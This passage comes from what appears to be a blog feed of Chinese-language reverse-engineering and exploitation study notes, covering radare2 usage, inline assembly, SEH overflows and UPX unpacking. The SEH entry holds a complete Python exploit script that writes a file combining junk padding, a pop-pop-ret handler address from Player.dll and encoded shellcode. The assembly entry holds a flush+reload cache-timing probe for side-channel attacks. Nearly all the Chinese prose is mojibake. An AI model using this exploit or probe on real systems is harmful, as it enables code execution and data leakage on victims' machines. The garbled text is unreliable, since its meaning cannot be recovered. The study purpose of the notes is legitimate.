æ­¤æˆ‘ä»¬éœ€è¦å¯¹å…¶è¿›è¡Œé…ç½®ï¼š<br>[0x080483d0]&gt; e search.in = dbg.maps<br>è¦ä»¥å¯è§†æ–¹å¼é…ç½®é›·è¾¾ï¼Œè¯·ä½¿ç”¨Ve</p><hr><pre><code>Usage: /[!bf] [arg]  Search stuffdmm   List modules of target process[0x080483d0]&gt; ?X 0xf7700768-0xf7599000</code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> RCE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å­¦ä¹ r2</title>
      <link href="/2020/09/24/%E5%AD%A6%E4%B9%A0r2/"/>
      <url>/2020/09/24/%E5%AD%A6%E4%B9%A0r2/</url>
      
        <content type="html"><![CDATA[<h2 id="é€†å‘-å­¦ä¹ r2"><a href="#é€†å‘-å­¦ä¹ r2" class="headerlink" title="é€†å‘ å­¦ä¹ r2"></a>é€†å‘ å­¦ä¹ r2</h2><h3 id="RABIN2-â€”-Binary-program-info-extractor"><a href="#RABIN2-â€”-Binary-program-info-extractor" class="headerlink" title="RABIN2 â€” Binary program info extractor"></a>RABIN2 â€” Binary program info extractor</h3><pre><code>$ rabin2 -I megabeets_0x1</code></pre><p><code>stripped false</code><br>æ²¡æœ‰å‰¥ç¦»ç¬¦å·è¡¨<br><code>static   false</code> //æ‰€ä»¥æ˜¯åŠ¨æ€é“¾æ¥<br><a id="more"></a></p><h3 id="r2-radare2"><a href="#r2-radare2" class="headerlink" title="r2 //radare2"></a>r2 //radare2</h3><h4 id="ie"><a href="#ie" class="headerlink" title="ie"></a>ie</h4><pre><code>[0x08048370]&gt; ie</code></pre><p>ie å‘½ä»¤å¯ä»¥æ‰“å°å‡ºç¨‹åºçš„å…¥å£ç‚¹</p><hr><h4 id><a href="#" class="headerlink" title="?"></a>?</h4><p>åœ¨ä»»ä½•ä¸€ä¸ªå‘½ä»¤åé¢æ·»åŠ  ? æ¥è·å¾—æ›´å¤šçš„å­å‘½ä»¤ä¿¡æ¯ï¼š<br>    [0x08048370]&gt; i?</p><hr><h4 id="aa"><a href="#aa" class="headerlink" title="aa"></a>aa</h4><p>ä½¿ç”¨ â€˜aaâ€™ å‘½ä»¤æ¥åˆ†ææ–‡ä»¶</p><pre><code>[0x08048370]&gt; a?</code></pre><p>aa?<br>aaa[?]              autoname functions after aa (see afna)</p><hr><h4 id="flag"><a href="#flag" class="headerlink" title="flag"></a>flag</h4><p>flag æ˜¯æ‰€æœ‰ç±»ä¼¼ç‰¹å¾çš„é›†åˆï¼Œå±•ç¤ºæ‰€æœ‰çš„ flag ï¼Œç”¨ â€˜fsâ€™ å‘½ä»¤<br>    [0x08048370]&gt; fs</p><h4 id="f"><a href="#f" class="headerlink" title="f"></a>f</h4><p> f         list flags (will only list flags from selected flagspaces<br>    [0x08048370]&gt; fs imports; f</p><hr><h4 id="iz"><a href="#iz" class="headerlink" title="iz"></a>iz</h4><p>iz â€“ åˆ—å‡ºæ•°æ®æ®µé‡Œçš„å­—ç¬¦ä¸²</p><hr><h4 id="axt"><a href="#axt" class="headerlink" title="axt"></a>axt</h4><pre><code>[0x08048370]&gt; axt @@ str.*</code></pre><p> axt [addr]      find data/code references to this address</p><p><code>@@                   # foreach iterator command:</code></p><hr><h4 id="x"><a href="#x" class="headerlink" title="x"></a>x</h4><p>| x @@ sym.*          run â€˜xâ€™ over all flags matching â€˜sym.â€™ in current flagspace</p><hr><h4 id="s"><a href="#s" class="headerlink" title="s"></a>s</h4><p>s    # Help for the seek commands. See ?$? to see all variables</p><hr><h4 id="afl"><a href="#afl" class="headerlink" title="afl"></a>afl</h4><p>af?<br>ç”¨ â€˜aflâ€™ æŒ‡ä»¤ï¼Œè¿™ä¸ªæŒ‡ä»¤ä»£è¡¨ç€åˆ†æå‡½æ•°åˆ—è¡¨ï¼ˆAnalyze Functions Listï¼‰.</p><hr><h4 id="pdf"><a href="#pdf" class="headerlink" title="pdf"></a>pdf</h4><p>s main<br>ç”¨ â€˜pdfâ€™ï¼ˆè¾“å‡ºåæ±‡ç¼–ä»£ç ï¼‰</p><hr><h4 id="m"><a href="#m" class="headerlink" title="m"></a>m</h4><p>m<key> å¯ä»¥ç”¨æ¥æ ‡è®°ç‰¹å®šçš„åç§»åœ°å€ï¼Œä¹‹åè¾“å…¥å¯¹åº”çš„keyå°±å¯ä»¥è·³è½¬åˆ°ä½ è®¾ç½®çš„åœ°æ–¹.</key></p><hr><h4 id="V"><a href="#V" class="headerlink" title="V"></a>V</h4><p>V è§†å›¾æ¨¡å¼<br>shell é‡Œè¾“å…¥ VVæ¥è¿›å…¥å›¾å½¢æ¨¡å¼</p><hr><p>f sym.<tab> æ¥å®šä½å‡º sym.beet å‡½æ•°<br>pdf @ sym.beet å‘½ä»¤ï¼Œâ€˜@â€™ è¡¨ç¤ºä¸´æ—¶æŸ¥æ‰¾<br>å¯è§†è§†å›¾ç•Œé¢ç›´æ¥è·³è½¬åˆ° beet å‡½æ•°<br>ä¸Šé¢è¯´è¿‡çš„æ–¹æ¡†ä¸­çš„æ•°å­—å—ï¼Ÿè¿™é‡Œç›´æ¥æŒ‰ 3 å°±å¯ä»¥äº†<br> gd å‘½ä»¤ï¼Œd å°±æ˜¯æ¯ä¸€ä¸ªè·³è½¬æˆ–è€…è°ƒç”¨ä»£ç æ—è¾¹çš„ å­—æ¯</tab></p><hr><h4 id="ahi"><a href="#ahi" class="headerlink" title="ahi"></a>ahi</h4><p>:&gt; ahi s @@=0x080485a3 0x080485ad 0x080485b7<br>ahi s       set base to string (1)<br>ahi s æ˜¯ç”¨æ¥è®¾ç½®å­—ç¬¦ä¸²ç‰¹å®šçš„åç§»åœ°å€<br>@@æ˜¯ä¸€ä¸ªè¿­ä»£å™¨ï¼Œå¯ä»¥ç”¨æ¥æ¥å—åé¢è¾“å…¥çš„å¤šä¸ªå‚æ•°,æ‰§è¡Œå®Œè¿™æ¡å‘½ä»¤å</p><hr><h4 id="r"><a href="#r" class="headerlink" title="r"></a>r</h4><p>r å›¾å½¢æ¨¡å¼åˆ·æ–°</p><hr><h3 id="rahash2"><a href="#rahash2" class="headerlink" title="rahash2"></a>rahash2</h3><p>rahash2 åŒ…å«å¾ˆå¤šç§ç®—æ³•æ¥æ±‚è¯ä¸€ä¸ªæ–‡ä»¶æˆ–è€…å­—ç¬¦ä¸²çš„æ ¡éªŒå€¼,å…·ä½“çš„ç”¨æ³•è¯·ä½¿ç”¨ â€˜man rahash2 â€˜.</p><hr><h4 id="00"><a href="#00" class="headerlink" title="00"></a>00</h4><p>oo           reopen current file<br>ood [args]      # reopen in debug mode (with args)</p><hr><h4 id="dc"><a href="#dc" class="headerlink" title="dc"></a>dc</h4><p>dc   Execution continuation commands<br>| dc                           Continue execution of all children</p>]]></content>
      
      
      
        <tags>
            
            <tag> RCE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ARMå†…è”æ±‡ç¼–</title>
      <link href="/2020/09/24/ARM%E5%86%85%E8%81%94%E6%B1%87%E7%BC%96/"/>
      <url>/2020/09/24/ARM%E5%86%85%E8%81%94%E6%B1%87%E7%BC%96/</url>
      
        <content type="html"><![CDATA[<h2 id="gcc-ARMå†…è”æ±‡ç¼–-ä¸-é¢„å¤„ç†"><a href="#gcc-ARMå†…è”æ±‡ç¼–-ä¸-é¢„å¤„ç†" class="headerlink" title="gcc ARMå†…è”æ±‡ç¼– ä¸ é¢„å¤„ç†"></a>gcc ARMå†…è”æ±‡ç¼– ä¸ é¢„å¤„ç†</h2><h3 id="é¢„å¤„ç†"><a href="#é¢„å¤„ç†" class="headerlink" title="é¢„å¤„ç†"></a>é¢„å¤„ç†</h3><p>define ç¼–è¯‘<code>é¢„å¤„ç†</code>æ—¶ï¼Œå¯¹ç¨‹åºä¸­æ‰€æœ‰å‡ºç°çš„â€œå®åâ€ï¼Œéƒ½ç”¨å®å®šä¹‰ä¸­çš„å­—ç¬¦ä¸²å»ä»£æ¢</p><p><code>#</code>å¼€å¤´éƒ½æ˜¯é¢„ç¼–è¯‘æŒ‡ä»¤</p><a id="more"></a><pre><code>#ifndef HEADER_FILE#define HEADER_FILEthe entire header file file#endif</code></pre><p>è¿™ç§ç»“æ„å°±æ˜¯é€šå¸¸æ‰€è¯´çš„<code>åŒ…è£…å™¨ #ifndef</code>ã€‚å½“å†æ¬¡å¼•ç”¨å¤´æ–‡ä»¶æ—¶ï¼Œ<code>æ¡ä»¶ä¸ºå‡</code>ï¼Œå› ä¸º HEADER_FILE å·²å®šä¹‰ã€‚æ­¤æ—¶ï¼Œé¢„å¤„ç†å™¨ä¼š<code>è·³è¿‡</code>æ–‡ä»¶çš„æ•´ä¸ªå†…å®¹ï¼Œç¼–è¯‘å™¨ä¼šå¿½ç•¥å®ƒã€‚</p><hr><p>æ‚¨å¯ä»¥ä½¿ç”¨ typedef ä¸ºä¸€ä¸ªå·²æœ‰çš„ç±»å‹å–ä¸€ä¸ªæ–°çš„åå­—ã€‚ä¸‹é¢æ˜¯ä½¿ç”¨ typedef å®šä¹‰ä¸€ä¸ªæ–°ç±»å‹çš„è¯­æ³•ï¼š</p><pre><code>typedef struct config *config_t; //å°†config* é‡æ–°å®šä¸º config_ttypedef type newname; </code></pre><hr><h3 id="ARMå†…è”æ±‡ç¼–"><a href="#ARMå†…è”æ±‡ç¼–" class="headerlink" title="ARMå†…è”æ±‡ç¼–"></a>ARMå†…è”æ±‡ç¼–</h3><p>GCCç¼–è¯‘å™¨æ”¯æŒç›´æ¥åœ¨Cæˆ–è€…C++ä»£ç ä¸­ï¼ŒåµŒå…¥ARMæ±‡ç¼–ä»£ç ã€‚å…¶åŸºæœ¬æ ¼å¼éå¸¸ç®€å•ï¼Œå¤§è‡´å¦‚ä¸‹ï¼š</p><pre><code>__asm__ [__volatile__] ( assembler template            : [output operand list]                  /* optional */           : [input operand list]                   /* optional */           : [clobbered register list]              /* optional */           );</code></pre><p>æ¯ä¸€ä¸ªæ“ä½œæ•°ç”±ä¸‹åˆ—ç»„æˆ</p><pre><code>[name]&quot;[modifier]constraint&quot;(C expression)</code></pre><p><code>name</code> è¡¨ç¤ºåˆ«å</p><p><code>é™å®šç¬¦</code>constraint</p><pre><code>  &quot;aâ€å°†è¾“å…¥å˜é‡æ”¾å…¥eax  &quot;bâ€å°†è¾“å…¥å˜é‡æ”¾å…¥ebxâ€œcâ€å°†è¾“å…¥å˜é‡æ”¾å…¥ecxâ€œdâ€å°†è¾“å…¥å˜é‡æ”¾å…¥edxâ€œsâ€å°†è¾“å…¥å˜é‡æ”¾å…¥esiâ€œdâ€å°†è¾“å…¥å˜é‡æ”¾å…¥edi</code></pre><p>GCCä¸­å®šä¹‰äº†ä¸‰ä¸ª<code>ä¿®æ”¹ç¬¦</code>modifierï¼Œåˆ†åˆ«æ˜¯ï¼š<br>ä¿®æ”¹ç¬¦    å«ä¹‰</p><pre><code>=    åªå†™æ“ä½œæ•°ï¼Œé€šå¸¸ç”¨äºè¾“å‡ºæ“ä½œæ•°ä¸­+    å¯è¯»ä¸”å¯å†™æ“ä½œæ•°ï¼Œå¿…é¡»è¦åˆ—åœ¨è¾“å‡ºæ“ä½œæ•°ä¸­&amp;    å¯„å­˜å™¨åªèƒ½ç”¨äºè¾“å‡º</code></pre><p>ç¼–è¯‘å™¨å¹¶ä¸ä¼šåˆ†æä½ çš„æ±‡ç¼–ä»£ç ï¼Œæ‰¾å‡ºè¿™ç§è¢«ä½ ä¿®æ”¹è¿‡ï¼Œéœ€è¦æ¢å¤çš„å¯„å­˜å™¨ï¼Œå› æ­¤ä½ å¿…é¡»æ˜¾å¼çš„å‘Šè¯‰ç¼–è¯‘å™¨ï¼Œè¢«ä½ ä¿®æ”¹è¿‡çš„å¯„å­˜å™¨æœ‰å“ªäº›ã€‚è¿™å°±æ˜¯<code>ä¿®æ”¹å¯„å­˜å™¨åˆ—è¡¨</code>æ‰€èµ·åˆ°çš„ä½œç”¨ã€‚<br><code>clobbered register list</code></p><h3 id="ç¤ºä¾‹-flush-and-reload"><a href="#ç¤ºä¾‹-flush-and-reload" class="headerlink" title="ç¤ºä¾‹__flush and reload"></a>ç¤ºä¾‹__flush and reload</h3><pre><code>/*SFENCEâ€”â€”ä¸²è¡ŒåŒ–å‘ç”Ÿåœ¨SFENCEæŒ‡ä»¤ä¹‹å‰çš„å†™æ“ä½œä½†æ˜¯ä¸å½±å“è¯»æ“ä½œã€‚    LFENCEâ€”â€”ä¸²è¡ŒåŒ–å‘ç”Ÿåœ¨SFENCEæŒ‡ä»¤ä¹‹å‰çš„è¯»æ“ä½œä½†æ˜¯ä¸å½±å“å†™æ“ä½œã€‚    MFENCEâ€”â€”ä¸²è¡ŒåŒ–å‘ç”Ÿåœ¨MFENCEæŒ‡ä»¤ä¹‹å‰çš„è¯»å†™æ“ä½œã€‚sfence:åœ¨sfenceæŒ‡ä»¤å‰çš„å†™æ“ä½œå½“å¿…é¡»åœ¨sfenceæŒ‡ä»¤åçš„å†™æ“ä½œå‰å®Œæˆã€‚lfenceï¼šåœ¨lfenceæŒ‡ä»¤å‰çš„è¯»æ“ä½œå½“å¿…é¡»åœ¨lfenceæŒ‡ä»¤åçš„è¯»æ“ä½œå‰å®Œæˆã€‚ no instruction fol-lowing it executes before thelfenceinstructionmfenceï¼šåœ¨mfenceæŒ‡ä»¤å‰çš„è¯»å†™æ“ä½œå½“å¿…é¡»åœ¨mfenceæŒ‡ä»¤åçš„è¯»å†™æ“ä½œå‰å®Œæˆã€‚*/</code></pre><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="title">gettime</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">volatile</span> <span class="keyword">unsigned</span> <span class="keyword">long</span> tl;</span><br><span class="line">  <span class="keyword">asm</span> __volatile__(<span class="string">"lfence\nrdtsc"</span> : <span class="string">"=a"</span> (tl): : <span class="string">"%edx"</span>); <span class="comment">//â€œ__volatile__â€å…³é”®å­—ï¼Œè¿™ä¸ªæ˜¯å¯é€‰çš„ï¼Œ</span></span><br><span class="line">  <span class="comment">//å…¶ä½œç”¨æ˜¯ç¦æ­¢ç¼–è¯‘å™¨å¯¹åé¢ç¼–å†™çš„æ±‡ç¼–æŒ‡ä»¤å†è¿›è¡Œä¼˜åŒ–</span></span><br><span class="line">  <span class="keyword">return</span> tl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">probe</span><span class="params">(<span class="keyword">char</span> *adrs)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">volatile</span> <span class="keyword">unsigned</span> <span class="keyword">long</span> time;</span><br><span class="line">    <span class="comment">//gcc arm</span></span><br><span class="line">  <span class="keyword">asm</span> __volatile__ (</span><br><span class="line">    <span class="string">"  mfence             \n"</span> <span class="comment">//cpuid (intel) è™šæ‹Ÿæœºä¼šæ¨¡æ‹Ÿè¯¥æŒ‡ä»¤ï¼Œå¯¼è‡´æ—¶é—´å¢åŠ </span></span><br><span class="line">    <span class="string">"  lfence             \n"</span></span><br><span class="line">    <span class="string">"  rdtsc              \n"</span></span><br><span class="line">    <span class="string">"  lfence             \n"</span> <span class="comment">//reads  the  64-bitcounter, returning the low 32 bits of the counter in%eax and the high 32 bits in%edx</span></span><br><span class="line">    <span class="string">"  movl %%eax, %%esi  \n"</span> <span class="comment">//æŠŠrdtscè¿”å›çš„æ—¶é—´ä¼ å…¥ESIä¿å­˜</span></span><br><span class="line">    <span class="string">"  movl (%1), %%eax   \n"</span> <span class="comment">//%1è¡¨ç¤ºadrs  reads  4  bytes  from  the  memory  address  in%ecx</span></span><br><span class="line">    <span class="string">"  lfence             \n"</span> <span class="comment">//ï¼ˆï¼‰è¡¨ç¤ºæŒ‡é’ˆ</span></span><br><span class="line">    <span class="string">"  rdtsc              \n"</span></span><br><span class="line">    <span class="string">"  subl %%esi, %%eax  \n"</span> <span class="comment">//rdtscè¿”å›å€¼ä¿å­˜åœ¨eax.ç›¸å‡ï¼Œç»“æœä¿å­˜åœ¨eax</span></span><br><span class="line">    <span class="string">"  clflush 0(%1)      \n"</span> <span class="comment">//()å‰”é™¤ç¼“å­˜ä¸­çš„å€¼</span></span><br><span class="line">    : <span class="string">"=a"</span> (time)</span><br><span class="line">    : <span class="string">"c"</span> (adrs)   <span class="comment">//c infer edc</span></span><br><span class="line">    :  <span class="string">"%esi"</span>, <span class="string">"%edx"</span>);</span><br><span class="line">  <span class="keyword">return</span> time;  <span class="comment">/*Loads shorter than the threshold are presumed tobe served from the cache, </span></span><br><span class="line"><span class="comment">                 indicating that another processhas accessed the memory line since it was last flushed5 from the cache*/</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> C++ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SEH</title>
      <link href="/2020/09/21/SEH/"/>
      <url>/2020/09/21/SEH/</url>
      
        <content type="html"><![CDATA[<h2 id="PWNå­¦ä¹ "><a href="#PWNå­¦ä¹ " class="headerlink" title="PWNå­¦ä¹ "></a>PWNå­¦ä¹ </h2><h4 id="Exploit-writing-tutorial-part-3-SEH-Based-Exploits"><a href="#Exploit-writing-tutorial-part-3-SEH-Based-Exploits" class="headerlink" title="Exploit writing tutorial part 3 : SEH Based Exploits"></a><a href="https://www.corelan.be/index.php/2009/07/25/writing-buffer-overflow-exploits-a-quick-and-basic-tutorial-part-3-seh/" title="Exploit writing tutorial part 3 : SEH Based Exploits" target="_blank" rel="noopener">Exploit writing tutorial part 3 : SEH Based Exploits</a></h4><a id="more"></a><p><img src="https://s1.ax1x.com/2020/09/21/wq8cwV.png" alt="wq8cwV.png"><br>1st exception occurs :<br> |<br> â€”â€”â€”â€”â€”â€”â€”â€”â€” (1)<br>                            |<br>                     â€”â€”-+â€”â€”â€”â€”â€“ (3) opcode in next SEH : jump over SE Handler to the shellcode<br>                     |      |             |<br>                     |      V             V<br>[ Junk buffer ][ next SEH ][ SE Handler ][ Shellcode ]<br>                opcode to   do                 (3) Shellcode gets executed<br>                jump over   pop pop ret<br>                SE Handler   |<br>                ^            |<br>                |            |<br>                â€”â€”â€”â€”â€“ (2) will â€˜pretendâ€™ thereâ€™s a second exception, puts address of next SEH location in EIP, so opcode gets executed</p><p>å½“ä¸€ä¸ªå¼‚å¸¸è§¦å‘æ—¶ï¼Œä¼šå»ºç«‹è‡ªå·±çš„æ ˆï¼Œpush EH Handlerçš„å‚æ•°ï¼Œåœ¨ESP+8å¤„çš„EstablisherFrameæŒ‡å‘ä¸‹ä¸€ä¸ªSEHï¼Œåœ¨è¿™é‡Œå†™pop pop retçš„åœ°å€</p><p>the <code>first pop</code> will take off<code>4 bytes</code> from the stack<br>the <code>second pop</code> will take another<code>4 bytes</code>from the stack<br>the <code>ret</code> will take the<code>current value</code>from the top of ESP ( = the address of the next SEH, which was at<code>ESP+8</code>, but because of the 2 popâ€™s now sits at the top of the stack) and puts that in <code>EIP</code>.</p><h5 id="SEHé“¾"><a href="#SEHé“¾" class="headerlink" title="SEHé“¾"></a>SEHé“¾</h5><p>ollydbg VIEW-SEH CHAIN</p><h5 id="pattern"><a href="#pattern" class="headerlink" title="pattern"></a>pattern</h5><p><code>msf-pattern_create -l 5000</code><br>äº§ç”Ÿä¸€ä¸ªåºåˆ—ï¼Œç”¨äºå®šä½æº¢å‡ºç‚¹</p><p>msf5 &gt; msfpescan -p Player.dll | grep -v â€œ000â€<br>å¯»æ‰¾pop pop ret å‘½ä»¤åœ°å€ -v ä¸åŒ¹é…â€œ000â€</p><p>int 3 æŒ‡ä»¤ï¼ˆ0xccï¼‰ ä¸­æ–­æŒ‡ä»¤</p><pre><code>import structuitext = &quot;ui_exploit.txt&quot;junk = &quot;\x41&quot; * 584seh_next = &quot;\xeb\x04\x90\x90&quot;seh_handler = str(struct.pack(&apos;&lt;L&apos;, 0x10018de8))shellcode = &quot;\xeb\x03\x59\xeb\x05\xe8\xf8\xff\xff\xff\x4f\x49\x49\x49\x49\x49&quot; +\            &quot;\x49\x51\x5a\x56\x54\x58\x36\x33\x30\x56\x58\x34\x41\x30\x42\x36&quot; +\            &quot;\x48\x48\x30\x42\x33\x30\x42\x43\x56\x58\x32\x42\x44\x42\x48\x34&quot; +\            &quot;\x41\x32\x41\x44\x30\x41\x44\x54\x42\x44\x51\x42\x30\x41\x44\x41&quot; +\            &quot;\x56\x58\x34\x5a\x38\x42\x44\x4a\x4f\x4d\x4e\x4f\x4a\x4e\x46\x44&quot; +\            &quot;\x42\x30\x42\x50\x42\x30\x4b\x38\x45\x54\x4e\x33\x4b\x58\x4e\x37&quot; +\            &quot;\x45\x50\x4a\x47\x41\x30\x4f\x4e\x4b\x38\x4f\x44\x4a\x41\x4b\x48&quot; +\            &quot;\x4f\x35\x42\x32\x41\x50\x4b\x4e\x49\x34\x4b\x38\x46\x43\x4b\x48&quot; +\            &quot;\x41\x30\x50\x4e\x41\x43\x42\x4c\x49\x39\x4e\x4a\x46\x48\x42\x4c&quot; +\            &quot;\x46\x37\x47\x50\x41\x4c\x4c\x4c\x4d\x50\x41\x30\x44\x4c\x4b\x4e&quot; +\            &quot;\x46\x4f\x4b\x43\x46\x35\x46\x42\x46\x30\x45\x47\x45\x4e\x4b\x48&quot; +\            &quot;\x4f\x35\x46\x42\x41\x50\x4b\x4e\x48\x46\x4b\x58\x4e\x30\x4b\x54&quot; +\            &quot;\x4b\x58\x4f\x55\x4e\x31\x41\x50\x4b\x4e\x4b\x58\x4e\x31\x4b\x48&quot; +\            &quot;\x41\x30\x4b\x4e\x49\x38\x4e\x45\x46\x52\x46\x30\x43\x4c\x41\x43&quot; +\            &quot;\x42\x4c\x46\x46\x4b\x48\x42\x54\x42\x53\x45\x38\x42\x4c\x4a\x57&quot; +\            &quot;\x4e\x30\x4b\x48\x42\x54\x4e\x30\x4b\x48\x42\x37\x4e\x51\x4d\x4a&quot; +\            &quot;\x4b\x58\x4a\x56\x4a\x50\x4b\x4e\x49\x30\x4b\x38\x42\x38\x42\x4b&quot; +\            &quot;\x42\x50\x42\x30\x42\x50\x4b\x58\x4a\x46\x4e\x43\x4f\x35\x41\x53&quot; +\            &quot;\x48\x4f\x42\x56\x48\x45\x49\x38\x4a\x4f\x43\x48\x42\x4c\x4b\x37&quot; +\            &quot;\x42\x35\x4a\x46\x42\x4f\x4c\x48\x46\x50\x4f\x45\x4a\x46\x4a\x49&quot; +\            &quot;\x50\x4f\x4c\x58\x50\x30\x47\x45\x4f\x4f\x47\x4e\x43\x36\x41\x46&quot; +\            &quot;\x4e\x36\x43\x46\x42\x50\x5a&quot;junk2 = &quot;\x90&quot; * 1000fp = open(uitext, &apos;w&apos;)content = junk + seh_next + seh_handler + shellcode + junk2fp.write(content)fp.close()</code></pre><p>æ€»ç»“ï¼š<br>SEHé“¾æ¡ç»“æ„åŠå…¶åœ¨æ ˆä¸­çš„ä½ç½®<br>Windows XP SP1æ·»åŠ çš„XORå’ŒSafeSEHä¿æŠ¤æœºåˆ¶<br>é€šè¿‡msfçš„msfpescanä»dllä¸­æŸ¥æ‰¾å¸¦æœ‰æƒ³è¦æ“ä½œçš„å‡½æ•°ï¼ˆâ€œPOP POP RETâ€ï¼‰<br>RETæ“ä½œä½œä¸ºexploitæ–¹å¼çš„ä¼˜ç¼ºç‚¹<br>é€šè¿‡<code>windbg</code>çš„â€!analyze -vâ€œ å’Œâ€œ!exchainâ€å‘½ä»¤æŸ¥çœ‹current SEHæŒ‡é’ˆå†…å®¹<br>windbgï¼šd eip ; !exchainå‘½ä»¤ ï¼›u åœ°å€ ï¼›g è¿è¡Œ</p><p>frog é’è›™</p>]]></content>
      
      
      
        <tags>
            
            <tag> PWN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>RCE åˆæ¢</title>
      <link href="/2020/08/18/RCE%20%E5%88%9D%E6%8E%A2/"/>
      <url>/2020/08/18/RCE%20%E5%88%9D%E6%8E%A2/</url>
      
        <content type="html"><![CDATA[<h4 id="UPX"><a href="#UPX" class="headerlink" title="UPX"></a>UPX</h4><p>upx == åŠ å£³ï¼Ÿ<br>ä»£ç å‹ç¼©å™¨ï¼Œæ‰§è¡Œæ—¶è§£ç åè¿è¡Œ<br>PS  .\upx.exe -1 -o notepad_upx.exe D:\RCE\notepad.exe</p><a id="more"></a><hr><p>æ®µå¯„å­˜å™¨ 16 ä½<br>DS å­˜æ”¾æ•°æ®æ®µçš„æ®µåŸºå€</p><hr><p>æ¯ä¸€ä¸ª<code>å†…å­˜å•å…ƒçš„å®½åº¦ä¸º8ä½</code>ã€‚<br>[ç¼–å·]ç§°ä¸ºåœ°å€ã€‚<br>å†…å­˜å•å…ƒï¼šå­—èŠ‚ <code>æ¯ä¸ªå­—èŠ‚æœ‰ä¸ªç¼–å·</code>ï¼Œç§°ä¸º<code>å†…å­˜åœ°å€</code></p><hr><p>dword ptr [esi+13000]=[notepad.01014000]=14D Lâ€™Åâ€™</p><p>ds å¯„å­˜å™¨æ²¡ç”¨ï¼Ÿ</p><hr><p>åœ¨æ ˆä¸­è®¾ç½®ç¡¬ä»¶æ–­ç‚¹ æ‰¾åˆ°è§£å£³åçš„OEP<br>å…·ä½“åœ¨<code>PUSHAD</code>ä¸­è®¾ç½®ç¡¬ä»¶æ–­ç‚¹ï¼ŒæŒ‡ä»¤å®Œæˆåæ‰æš‚åœ ï¼Œä¹Ÿå°±æ˜¯<code>POPAD</code> å®Œæˆåæš‚åœ ï¼Œåé¢JMPè·³è½¬åˆ°<code>OEP</code> original EP</p><hr><p>exeé»˜è®¤00400000<br>dll é»˜è®¤10000000</p><hr><h4 id="èŠ‚å¯¹é½"><a href="#èŠ‚å¯¹é½" class="headerlink" title="èŠ‚å¯¹é½"></a>èŠ‚å¯¹é½</h4><p>Alignment is <code>a rounded up value.</code> Section data size is rounded up for effeciency because the OS moves stuff around in chunks anyway.<br>The File Alignment is usually 512 bytes which fit the blocksize of most filesystems.<br>The Section Alignment is usually 4096 bytes which fit the size of a memory page.<br>So if you have a PE-file with a section (like â€œ.textâ€) that contains<code>513</code> bytes of data:</p><p><code>ä¸è¶³çš„æ”¹ä¸ºæ•´æ•°å€</code><br>Section .text will be rounded up to <code>1024</code> bytes on file.<br>Section .text will be rounded up to <code>4096</code>bytes in memory.<br>Note the amount of slack space possible both on file and in memory.</p><hr><h4 id="stud-pe"><a href="#stud-pe" class="headerlink" title="stud_pe"></a>stud_pe</h4><p>ä¿®æ”¹size of optional headerå€¼ï¼Œå‘æ–‡ä»¶å¤´æ’å…¥è§£ç ä»£ç <br>åœ¨é€‰é¡¹å¤´å’ŒèŠ‚åŒºå¤´é—´æ’å…¥ä»£ç <br>numberofRVAandSIZESè¡¨ç¤ºdata_directoryç»“æ„ä½“å…ƒç´ ä¸ªæ•°(æœ‰äº›æ²¡ç”¨ï¼Œå¯ä»¥è¦†ç›–)</p><h4 id="inline-patch-å†…åµŒè¡¥ä¸"><a href="#inline-patch-å†…åµŒè¡¥ä¸" class="headerlink" title="inline patch å†…åµŒè¡¥ä¸"></a>inline patch å†…åµŒè¡¥ä¸</h4><p>å°†è¡¥ä¸ä»£ç æ”¾åœ¨ç©ºç™½å—ä¸­</p><hr><p>å˜é‡åå’Œå‡½æ•°ååªæ˜¯åœ°å€çš„ä¸€ç§åŠ©è®°ç¬¦ï¼Œå½“æºæ–‡ä»¶è¢«ç¼–è¯‘å’Œé“¾æ¥æˆå¯æ‰§è¡Œç¨‹åºåï¼Œå®ƒä»¬éƒ½ä¼šè¢«æ›¿æ¢æˆåœ°å€ã€‚</p><p>å–åœ°å€ç¬¦&amp;</p><p>.text çš„ size of raw data == 400 virtual size == 280 æ–‡ä»¶ä¸­400 åŠ è½½åˆ°å†…å­˜ä¸­åªåŠ äº†280<br>å…¶ä»–å€¼æ—¶0x00</p><hr><p>image_scn_men_write ç›¸åº”å†…å­˜åŒºçš„å†™æƒé™</p><hr><h4 id="rep-movsb-å‘½ä»¤"><a href="#rep-movsb-å‘½ä»¤" class="headerlink" title="rep movsb å‘½ä»¤"></a>rep movsb å‘½ä»¤</h4><p> b==byte rep == repeats ECX é‡Œå¤§å° å¾ªç¯</p><h4 id="moves-å‘½ä»¤"><a href="#moves-å‘½ä»¤" class="headerlink" title="moves  å‘½ä»¤"></a>moves  å‘½ä»¤</h4><p>== ds:esi -&gt; ds:edi<br>decreasing CX, so at the end CX becomes zero.</p><h4 id="RCEç»éªŒ"><a href="#RCEç»éªŒ" class="headerlink" title="RCEç»éªŒ"></a>RCEç»éªŒ</h4><p>1 å‹ç¼©å™¨è§£ç <br>2 åŒºåŸŸåŒé‡åŠ å¯† å†…åµŒè¡¥ä¸</p><hr><h4 id="test-æŒ‰ä½ä¸"><a href="#test-æŒ‰ä½ä¸" class="headerlink" title="test æŒ‰ä½ä¸"></a>test æŒ‰ä½ä¸</h4><p>test eax, eax<br>eax==0 zf è®¾ä½1</p><hr><h4 